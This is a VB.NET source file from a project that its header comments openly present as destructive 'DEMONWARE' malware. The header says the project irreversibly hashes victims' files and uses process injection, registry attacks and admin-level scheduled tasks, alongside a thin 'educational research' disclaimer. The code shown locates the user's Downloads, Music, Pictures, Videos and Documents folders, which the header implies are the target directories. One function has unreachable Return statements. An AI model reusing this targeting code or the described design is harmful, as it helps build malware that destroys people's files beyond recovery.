REM: APPLICATION NAME: "RESURREXIT" | CREATION DATE: 12/26/2024  COPYRIGHT 2024 MIT LICENSE | LOCATION: WESTERN, MAINE 
REM: CREATOR: RYTHORIAN ETHROVON
REM: APPLICATION TYPE: "DEMONWARE X" :: (HYBRID-SPAWN OF: DARK HORIZON :: & :: IDES_OF_DAWN) SHA512 HASHING | PROCESS INJECTION | RE-SPAWNING -
REM: CONTINUE: :: TIME-BASED ATTACK | REGISTRY ATTACK | SCHEDULED TASK AT HIGHEST ADMIN-LEVEL.
REM: BLACK STAR RESEARCH FACILITY | CLASSIFIED NUMBER: K401-B726A419
REM: WARNING: THIS APPLICATION WORKS FAST AND WILL LITERALLY TARGET EVERY DIRECTORY YOU ASSIGN TO. 
REM: RESURREXIT USES (SHA512 HASHING) "IS NOT" ENCRYPTION, IT IS HASHING OF FILES WITH NO-HOPE OF RECOVERING THEM.
REM: NOT A BILLION COMPUTERS AT THE CURRENT TECHNOLOGY CAN EFFECT THE DAMAGE SHA512 CAN CAUSE
REM: FOR LIST OF GUIDS: https://www.tenforums.com/tutorials/3123-clsid-key-guid-shortcuts-list-windows-10-a.html
REM: FOR EDUCATIONAL RESEARCH ONLY :: CYBER-CRIME IS A FELONY | CREATING MALWARE OR RANSOMWARE VERIES FROM STATE TO STATE
REM: NATIVE METHODS ARE THE SMARTEST APPROACH AT DIRECTORIES.
REM: 3 MINUTES 10 SECONDS FOR 5 FOLDERS WITH SEVERAL GIGS A PIECE 
Imports System.Runtime.InteropServices

Partial Public Class NativeMethods
    <DllImport("shell32.dll")>
    Private Shared Function SHGetKnownFolderPath(<MarshalAs(UnmanagedType.LPStruct)>
                                         rfid As Guid,
                                         dwFlags As UInteger,
                                         hToken As IntPtr,
                                         ByRef pszPath As IntPtr) As Int32
    End Function

    ' in order, below are:
    Public Enum ShellSpecialFolders
        Downloads
        Music
        Pictures
        Videos
        Documents
        'Desktop
        'Contacts
        'Links
        'SavedGames
        'SavedSearches
    End Enum

    Private Shared ReadOnly ShellFolderGuids As Guid() = {
                        Guid.Parse("{374DE290-123F-4565-9164-39C4925E467B}"),'DOWNLOADS                     
                        Guid.Parse("{4BD8D571-6D19-48D3-BE97-422220080E43}"),'MUSIC
                        Guid.Parse("{33E28130-4E1E-4676-835A-98395C3BC3BB}"),'PICTURES                 
                        Guid.Parse("{18989B1D-99B5-455B-841C-AB7C74E4DDFC}"),'VIDEOS                 
                        Guid.Parse("{FDD39AD0-238F-46AF-ADB4-6C85480369C7}")'DOCUMENTS
                                         }
    ' Guid.Parse("{B4BFCC3A-DB2C-424C-B029-7FE99A87C641}"),'DESKTOP
    'Guid.Parse("{4C5C32FF-BB9D-43B0-B5B4-2D72E54EAAA4}"),'SAVED GAMES
    'Guid.Parse("{7D1D3A04-DEBB-4115-95CF-2F29DA2920DA}"),'SAVED SEARCHES
    '  Guid.Parse("{BFB9D5E0-C6A9-404C-B2B2-AE6DB6AF4968}"),'LINKS
    '  Guid.Parse("{56784854-C6CB-462B-8169-88E350ACB882}"),'CONTACTS
    Friend Shared Function GetSpecialFolder(folder As ShellSpecialFolders) As String

        Dim ret As Int32

        Dim fPath As IntPtr
        ' == "Dont Vertify" flag:
        Dim SHFlag As UInt32 = &H4000

        ret = SHGetKnownFolderPath(ShellFolderGuids(folder), SHFlag,
                                   New IntPtr(0), fPath)

        If ret = 0 Then


            Return Marshal.PtrToStringUni(fPath)

        Else
            Return ""
        End If
    End Function

    ' Optional single or multiple purpose 
    ' Every GUID if needed
    Friend Shared Function GetSpecialVideoFolder() As String

        Return GetSpecialFolder(ShellSpecialFolders.Videos)
        Return GetSpecialFolder(ShellSpecialFolders.Music)
        Return GetSpecialFolder(ShellSpecialFolders.Pictures)
        Return GetSpecialFolder(ShellSpecialFolders.Documents)
        Return GetSpecialFolder(ShellSpecialFolders.Downloads)

    End Function



End Class
